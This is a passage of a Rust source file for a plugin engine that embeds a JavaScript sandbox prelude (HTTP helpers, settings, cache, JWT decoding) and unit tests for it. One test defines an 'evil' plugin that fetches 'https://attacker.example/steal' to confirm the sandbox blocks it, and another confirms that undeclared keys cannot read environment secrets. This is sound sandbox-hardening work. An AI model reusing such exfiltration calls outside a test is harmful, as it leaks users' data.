      globalThis.__birdnionResult = { err: {
        kind: (e && e.__birdnionFailKind) || null,
        message: String((e && e.message) || e) } };
    });
} catch (e) {
  globalThis.__birdnionResult = { err: {
    kind: (e && e.__birdnionFailKind) || null,
    message: String((e && e.message) || e) } };
}
"#;

const PRELUDE: &str = r##"
"use strict";
globalThis.__birdnionPluginDef = undefined;
globalThis.defineProvider = function (def) { globalThis.__birdnionPluginDef = def; };

function __bnFailKind(kind) {
  return function (message, opts) {
    var e = new Error(String(message));
    e.__birdnionFailKind = kind;
    if (opts && opts.retryAfterSeconds != null) e.retryAfterSeconds = opts.retryAfterSeconds;
    return e;
  };
}

function __bnB64Decode(s) {
  var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  s = String(s).replace(/-/g, "+").replace(/_/g, "/");
  while (s.length % 4) s += "=";
  var out = "";
  var i = 0;
  while (i < s.length) {
    var e = [s.charCodeAt(i++), s.charCodeAt(i++), s.charCodeAt(i++), s.charCodeAt(i++)]
      .map(function (c) { return chars.indexOf(String.fromCharCode(c)); });
    var n = (e[0] << 18) | (e[1] << 12) | (e[2] << 6) | e[3];
    out += String.fromCharCode((n >> 16) & 255);
    if (e[2] >= 0) out += String.fromCharCode((n >> 8) & 255);
    if (e[3] >= 0) out += String.fromCharCode(n & 255);
  }
  return decodeURIComponent(escape(out));
}

function __bnMakeCtx() {
  var cacheMap = {};
  var ctx = {
    fail: {
      authenticationExpired: __bnFailKind("authenticationExpired"),
      missingCredential: __bnFailKind("missingCredential"),
      permissionDenied: __bnFailKind("permissionDenied"),
      rateLimited: __bnFailKind("rateLimited"),
      providerUnavailable: __bnFailKind("providerUnavailable"),
      parseFailure: __bnFailKind("parseFailure"),
      networkFailure: __bnFailKind("networkFailure"),
      apiFailure: __bnFailKind("apiFailure")
    },
    http: {
      get: function (url, opts) {
        var r = __birdnionHttp(JSON.stringify({
          method: "GET", url: String(url),
          headers: (opts && opts.headers) || {},
          timeoutSeconds: opts && opts.timeoutSeconds }));
        if (r && r.error) throw ctx.fail.networkFailure(r.error);
        return Promise.resolve(r);
      },
      getJSON: function (url, opts) {
        return ctx.http.get(url, opts).then(function (r) {
          return { url: r.url, status: r.status, headers: r.headers,
                   json: JSON.parse(r.bodyText) };
        });
      },
      post: function (url, opts) {
        var r = __birdnionHttp(JSON.stringify({
          method: "POST", url: String(url),
          headers: (opts && opts.headers) || {},
          body: opts ? JSON.stringify(opts.body) : undefined,
          timeoutSeconds: opts && opts.timeoutSeconds }));
        if (r && r.error) throw ctx.fail.networkFailure(r.error);
        return Promise.resolve(r);
      },
      postJSON: function (url, opts) {
        return ctx.http.post(url, opts).then(function (r) {
          return { url: r.url, status: r.status, headers: r.headers,
                   json: JSON.parse(r.bodyText) };
        });
      },
      getWithOptional: function (url, optionalURL, opts) {
        return Promise.all([ctx.http.get(url, opts),
                            ctx.http.get(optionalURL, opts).catch(function () { return null; })])
          .then(function (rs) {
            var r = rs[0]; r.optional = rs[1]; return r;
          });
      }
    },
    settings: {
      get: function (key) { return __birdnionGetSecret(String(key)); },
      getSecret: function (key) { return __birdnionGetSecret(String(key)); }
    },
    browser: {
      availability: function () { return "off"; },
      rejectCookie: function () {},
      sessions: function () {
        return (async function* () {})();
      },
      cookieHeader: function () {
        return Promise.reject(ctx.fail.apiFailure("browser cookies are not supported by BirdNion plugins yet"));
      }
    },
    html: {
      metaContent: function (html, name) {
        var re = new RegExp("<meta[^>]+(?:name|property)=[\"']" + name + "[\"'][^>]+content=[\"']([^\"']*)", "i");
        var m = String(html).match(re);
        if (m) return m[1];
        var re2 = new RegExp("<meta[^>]+content=[\"']([^\"']*)[\"'][^>]+(?:name|property)=[\"']" + name + "[\"']", "i");
        var m2 = String(html).match(re2);
        return m2 ? m2[1] : null;
      },
      matchFirst: function (html, regexSource, flags) {
        var m = String(html).match(new RegExp(regexSource, flags));
        return m ? (m[1] !== undefined ? m[1] : m[0]) : null;
      }
    },
    date: {
      now: function () { return new Date(); },
      iso: function (v) { return new Date(v); },
      unixSeconds: function (v) { return new Date(v * 1000); },
      unixMillis: function (v) { return new Date(v); },
      nextDailyReset: function (tz, hour) { return new Date(__birdnionNextDailyReset(String(tz), hour)); }
    },
    format: {
      currency: function (v, code) { return __birdnionFormatCurrency(v, String(code)); },
      number: function (v, opts) { return __birdnionFormatNumber(v, opts); },
      usd: function (v) { return __birdnionFormatUSD(v); },
      monthDay: function (v) {
        var d = v instanceof Date ? v : new Date(v);
        return (d.getMonth() + 1) + "/" + d.getDate();
      }
    },
    env: { timeZone: (function () {
      try { return Intl.DateTimeFormat().resolvedOptions().timeZone || "UTC"; }
      catch (e) { return "UTC"; }
    })() },
    cache: {
      get: function (key) {
        var e = cacheMap[key];
        if (!e) return undefined;
        if (Date.now() > e.expires) { delete cacheMap[key]; return undefined; }
        return e.value;
      },
      set: function (key, value, ttlSeconds) {
        cacheMap[key] = { value: value, expires: Date.now() + ttlSeconds * 1000 };
      }
    },
    storage: {
      get: function (key) { return __birdnionStorageGet(String(key)); },
      set: function (key, value) { __birdnionStorageSet(String(key), String(value)); },
      remove: function (key) { __birdnionStorageRemove(String(key)); }
    },
    jwt: {
      decode: function (token) {
        var parts = String(token).split(".");
        if (parts.length < 2) throw ctx.fail.parseFailure("malformed JWT");
        return JSON.parse(__bnB64Decode(parts[1]));
      }
    },
    log: function () {
      var parts = [];
      for (var i = 0; i < arguments.length; i++) parts.push(String(arguments[i]));
      __birdnionLog(parts.join(" "));
    },
    pct: function (used, limit) {
      if (!isFinite(used) || !isFinite(limit) || limit <= 0) return 0;
      return Math.max(0, Math.min(100, (used / limit) * 100));
    },
    amountFromPercent: function (percent, limit) {
      if (!isFinite(percent) || !isFinite(limit)) return 0;
      return (percent / 100) * limit;
    },
    isDetailLabel: function (v) {
      return typeof v === "string" && v.trim().length > 0;
    }
  };
  return ctx;
}
globalThis.__birdnionCtx = __bnMakeCtx();
"##;

#[cfg(test)]
mod tests {
    use super::*;

    fn engine(source: &str) -> Engine {
        Engine::new(source, Some("sk-demo".into()), None).expect("engine")
    }

    #[test]
    fn manifest_parses() {
        let e = engine(r#"
            defineProvider({
              id: "demo", name: "Demo Provider",
              endpoints: ["https://api.demo.test"],
              auth: { type: "bearer", secret: "DEMO_API_KEY" },
              settings: [{ key: "DEMO_API_KEY", title: "Demo key", type: "secure" }],
              capabilities: ["http-status"],
              fetchUsage(ctx) { return { empty: true }; }
            });
        "#);
        assert_eq!(e.manifest.id, "demo");
        assert_eq!(e.manifest.name, "Demo Provider");
        assert_eq!(e.manifest.auth.unwrap().kind, "bearer");
        assert!(e.manifest.capabilities.contains("http-status"));
    }

    #[test]
    fn missing_define_provider_fails() {
        assert!(Engine::new("var x = 1;", None, None).is_err());
    }

    #[test]
    fn sync_throw_surfaces_error() {
        let mut e = engine(r#"
            defineProvider({
              id: "failer", name: "Failer", endpoints: [], settings: [],
              fetchUsage(ctx) { throw ctx.fail.rateLimited("slow down"); }
            });
        "#);
        let err = e.fetch_usage().unwrap_err();
        assert!(err.contains("slow down"), "{err}");
    }

    #[test]
    fn blocked_endpoint_surfaces_network_failure() {
        let mut e = engine(r#"
            defineProvider({
              id: "evil", name: "Evil", endpoints: ["https://ok.test"],
              settings: [],
              fetchUsage(ctx) {
                return ctx.http.get("https://attacker.example/steal")
                  .then(function () { return { empty: true }; });
              }
            });
        "#);
        let err = e.fetch_usage().unwrap_err();
        assert!(err.contains("endpoint not allowed"), "{err}");
    }

    #[test]
    fn window_mapping() {
        let mut e = engine(r#"
            defineProvider({
              id: "quota-demo", name: "Quota Demo", endpoints: [], settings: [],
              fetchUsage(ctx) {
                return {
                  primary: { usedPercent: 42, windowMinutes: 300,
                             resetsAt: "2030-01-01T00:00:00Z" },
                  secondary: { usageKnown: false, windowMinutes: 10080 },
                  extraWindows: [{ id: "m", title: "Monthly", usedPercent: 55 }],
                  identity: { email: "u@demo.test" }
                };
              }
            });
        "#);
        let result = e.fetch_usage().unwrap();
        let status = map_status(&result, "quota-demo", "Quota Demo");
        assert_eq!(status.windows.len(), 3);
        assert_eq!(status.windows[0].label, "5 giờ");
        assert_eq!(status.windows[0].used_pct, 42);
        assert_eq!(status.windows[0].remaining_pct, 58);
        assert_eq!(status.windows[0].window_seconds, Some(18000));
        assert!(status.windows[0].resets_at.is_some());
        assert_eq!(status.windows[1].label, "Tuần");
        assert_eq!(status.windows[1].used_pct, 0); // usageKnown false
        assert_eq!(status.windows[2].label, "Monthly");
        assert_eq!(status.account_label.as_deref(), Some("u@demo.test"));
    }

    #[test]
    fn bundled_atlascloud_manifest_loads() {
        let e = engine(BUNDLED[0].1);
        assert_eq!(e.manifest.id, "atlascloud");
        assert_eq!(e.manifest.name, "Atlas Cloud");
        assert_eq!(
            e.manifest.auth.as_ref().map(|a| a.secret.as_str()),
            Some("ATLASCLOUD_API_KEY")
        );
    }

    /// `ctx.settings.get` must not resolve keys the plugin never declared —
    /// otherwise JS could read arbitrary process environment variables.
    #[test]
    fn undeclared_setting_key_resolves_null() {
        std::env::set_var("BIRDNION_TEST_LEAK", "leaked-secret");
        let mut e = engine(r#"
            defineProvider({
              id: "nosnoop", name: "Nosnoop", endpoints: [], settings: [],
              fetchUsage(ctx) {
                const v = ctx.settings.getSecret("BIRDNION_TEST_LEAK");
                return { primary: { usedPercent: (v === undefined || v === null) ? 7 : 99 } };
              }
            });
        "#);
        let result = e.fetch_usage().unwrap();
        std::env::remove_var("BIRDNION_TEST_LEAK");
        let status = map_status(&result, "nosnoop", "Nosnoop");
        assert_eq!(status.windows[0].used_pct, 7);
    }

    /// Declared keys still resolve — including the auth secret itself, which
    /// upstream plugins read as a presence check (e.g. gitkraken).
    #[test]
    fn declared_keys_resolve() {
        let mut e = engine(r#"
            defineProvider({
              id: "declared", name: "Declared", endpoints: ["https://api.d.test"],
              auth: { type: "bearer", secret: "DEMO_TOKEN" },
              settings: [{ key: "DEMO_TOKEN", title: "Token", type: "secure" }],
              fetchUsage(ctx) {
                const secret = ctx.settings.getSecret("DEMO_TOKEN");
                return { primary: { usedPercent: secret === "sk-demo" ? 33 : 0 } };
              }
            });
        "#);
        let result = e.fetch_usage().unwrap();
        let status = map_status(&result, "declared", "Declared");
        assert_eq!(status.windows[0].used_pct, 33);
    }

    /// A declared non-secret, non-URL key resolves env-only — it must not
    /// fall back to the provider's stored credential.
    #[test]
    fn declared_plain_setting_never_returns_secret() {
        let mut e = engine(r#"
            defineProvider({
              id: "plain", name: "Plain", endpoints: ["https://api.p.test"],
              auth: { type: "bearer", secret: "PLAIN_TOKEN" },
              settings: [{ key: "PLAIN_REGION", title: "Region" }],
              fetchUsage(ctx) {
                const region = ctx.settings.get("PLAIN_REGION");
                return { primary: { usedPercent: (region === undefined || region === null) ? 11 : 0 } };
              }
            });
        "#);
        let result = e.fetch_usage().unwrap();
        let status = map_status(&result, "plain", "Plain");
        assert_eq!(status.windows[0].used_pct, 11);
    }

    #[test]
    fn private_ipv4_covers_full_rfc1918() {
        assert!(is_private_ipv4("172.16.0.1"));
        assert!(is_private_ipv4("172.31.255.1"));
        assert!(!is_private_ipv4("172.15.0.1"));
        assert!(!is_private_ipv4("172.32.0.1"));
        assert!(is_private_ipv4("10.0.0.1"));
        assert!(is_private_ipv4("192.168.1.1"));
        assert!(!is_private_ipv4("8.8.8.8"));
    }
}
